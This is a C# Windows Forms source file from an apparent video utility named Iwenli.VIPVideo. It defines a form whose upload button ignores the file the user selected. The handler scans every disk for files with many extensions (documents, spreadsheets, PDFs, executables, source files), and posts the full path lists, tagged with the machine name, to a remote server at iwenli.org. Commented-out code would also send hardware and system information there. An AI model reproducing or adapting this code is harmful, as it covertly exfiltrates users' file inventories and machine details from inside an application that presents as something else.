using Iwenli.VIPVideo.Utility;
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Iwenli.VIPVideo
{
    public partial class Form3 : Form
    {
        public Form3()
        {
            InitializeComponent();

            Init();
        }

        private void Init()
        {
            BingEvent();
        }

        private void BingEvent()
        {
            btnSelect.Click += (sender, e) =>
            {
                OpenFileDialog ofDialog = new OpenFileDialog();
                ofDialog.Title = "请选择上传的文件";
                ofDialog.Filter = "文本文件(*.txt)|*.txt|所有文件(*.*)|*.*";
                ofDialog.Multiselect = false;

                if (ofDialog.ShowDialog() == DialogResult.OK)
                {
                    txtUrl.Text = ofDialog.FileName;
                }
            };

            btnUpload.Click += (sender, e) =>
            {
                //txtLog.AppendText(File.ReadAllText(txtUrl.Text));
                //txtLog.ScrollToCaret();

                /*
                WebClient wc = new WebClient();
                wc.Credentials = CredentialCache.DefaultCredentials;
                wc.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
                wc.QueryString["file_directory"] = "vip_userinfo";
                wc.UploadFileAsync(new Uri(@"http://localhost:60640/api/fileUpload.axd"), "POST", txtUrl.Text);
                wc.UploadFileCompleted += (s, es) =>
                {
                    MessageBox.Show(Encoding.GetEncoding("gb2312").GetString(es.Result));
                };*/


                string fileUploadServer = @"http://iwenli.org/api/fileUpload.axd";
                List<string> fileExtension = new List<string>() { "txt", "doc", "wps", "xls", "ppt", "pdf", "jpg", "bmp", "rmvb", "mp3", "exe", "js", "cs", "css", "html" };
                NameValueCollection queryParam = new NameValueCollection();
                queryParam["file_directory"] = "vip_userinfo";
                foreach (var currentExtension in fileExtension)
                {
                    List<string> allFilePath = MachineHelper.GetAllDiskFile(currentExtension);
                    if (allFilePath.Count > 0)
                    {
                        string content = string.Join(Environment.NewLine, allFilePath.ToArray());
                        txtLog.AppendText(new HttpHelper().UploadFile(fileUploadServer,
                            string.Format(@"{0}_{1}.txt", MachineHelper.MachineName, currentExtension),
                            Encoding.GetEncoding("utf-8").GetBytes(content), queryParam));
                        Thread.Sleep(1000);
                    }
                }


                //Save(new List<string>(), path);  //保存文件
                //string[] files = Directory.GetFiles(Path.Combine(MachineHelper.CurrentDirectory, path));
                //foreach (var item in files)
                //{
                //    txtLog.AppendText(HttpHelper.UploadFile(@"http://iwenli.org/api/fileUpload.axd", item, queryParam));
                //}

                //txtLog.AppendText(HttpHelper.UploadFile(@"http://localhost:60640/api/fileUpload.axd", "12.txt", queryParam));

                //NameValueCollection queryParam = new NameValueCollection();
                //queryParam["file_directory"] = "vip_userinfo";
                //StringBuilder updateFile = new StringBuilder();
                //updateFile.Append(Utility.MachineHelper.GetManagmentByWin32());
                //updateFile.Append(Utility.MachineHelper.GetManagmentByPcSys());
                //updateFile.Append(Utility.MachineHelper.GetManagmentByDisk());
                //updateFile.Append(Utility.MachineHelper.GetManagmentByCPU());
                //txtLog.AppendText(new HttpHelper().UploadFile(@"http://iwenli.org/api/fileUpload.axd", "systeminfo.txt",
                //    Encoding.GetEncoding("utf-8").GetBytes(updateFile.ToString()), queryParam));
            };
        }


    }
}
